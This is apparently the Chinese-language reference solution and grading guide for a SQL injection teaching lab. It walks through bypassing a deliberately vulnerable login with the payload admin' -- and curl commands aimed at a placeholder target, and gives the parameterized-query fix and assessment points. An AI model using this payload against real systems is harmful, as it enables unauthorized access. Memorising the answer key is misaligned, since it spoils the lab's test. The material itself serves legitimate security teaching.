# SQL 注入基础实验 · 参考解答

## 目标与实现边界

本实验是 `sqli-basic` 教学登录页，使用 **GET /login** 和 SQLite。页面将用户名、密码直接拼接为 SQL；数据库中的 admin 密码为随机值。本实验不需要猜密码，目标是证明输入能够越过字符串边界，改变查询条件。它与 A05 进阶实验的 POST 接口不同。

## 复现步骤

### 1. 建立失败基线

在 Kali 浏览器打开实验地址，用户名填写 `admin`，密码填写 `wrong`，点击登录。预期正文是“用户名或密码错误”。也可在 Kali 终端执行：

```bash
TARGET='http://TARGET_IP:8000'
curl -sS --get "$TARGET/login" \
  --data-urlencode 'username=admin' --data-urlencode 'password=wrong'
```

本靶机登录成功、失败及 SQL 错误都返回 HTTP 200，因此 **不能仅看状态码**。

### 2. 验证引号边界

用户名先填单个英文半角引号 `'`，密码仍填 `wrong`。预期页面显示“SQL 查询错误，请检查输入”。这说明输入影响了查询结构；错误反馈本身还不等于成功绕过。

### 3. 绕过密码条件

用户名填 `admin' -- `（admin 后紧接一个英文引号，两个减号后可留一个空格），密码填任意非敏感测试值，再登录：

```bash
curl -sS --get "$TARGET/login" \
  --data-urlencode "username=admin' -- " --data-urlencode 'password=wrong'
```

拼接后查询形如：

```sql
SELECT username FROM users WHERE username = 'admin' -- ' AND password = 'wrong'
```

引号结束原字符串，`--` 将后面的密码条件注释掉，剩余条件命中 admin。预期正文出现“登录成功，实验 Flag”。复制**本次页面中的完整 Flag**，提交到平台判题区域。

## 常见失败与解释

- `admin '' --` 中两个相邻引号可以作为字符串内部的引号转义，并不等同于正确结束字符串。
- `admin ' --` 会把用户名变成带尾部空格的 `admin `，不匹配当前数据库中的 `admin`。不要混淆引号前与注释后的空格。
- 中文弯引号 `’`、全角符号不等于 SQL 使用的英文半角引号。优先对照复制，再解释每个字符的作用。
- 直接在 URL 里手工拼空格、引号容易编码错误；用表单或 `--data-urlencode`。
- 本教学页使用 GET，密码会进入 URL；测试只使用无敏感意义的值。真实登录应使用 HTTPS 下的 POST，并处理日志与 URL 脱敏；换 POST 本身不能修复 SQL 注入。

## 修复思路与回归

把输入作为值绑定，而不是拼接为 SQL 结构：

```python
row = db.execute(
    'SELECT username FROM users WHERE username = ? AND password = ?',
    (username, password),
).fetchone()
```

这是本教学查询的最小修复示意。真实系统还应按用户名读取口令哈希并用口令哈希库验证，不存储明文密码。修复后，普通正确凭据仍可登录；上述注入内容应被当作字面用户名而失败，单引号不应造成 SQL 语法错误。

## 本实验评估要点

核实失败基线、正确闭合引号与注释密码条件的操作、正文中的成功结果以及根因说明。接受能命中记录的等价布尔表达式。若只有表单提交和跳转记录，可确认“尝试了注入”，不能确认已登录成功；平台正确判题记录可支持已获得有效 Flag，但不能替代对原理的解释。
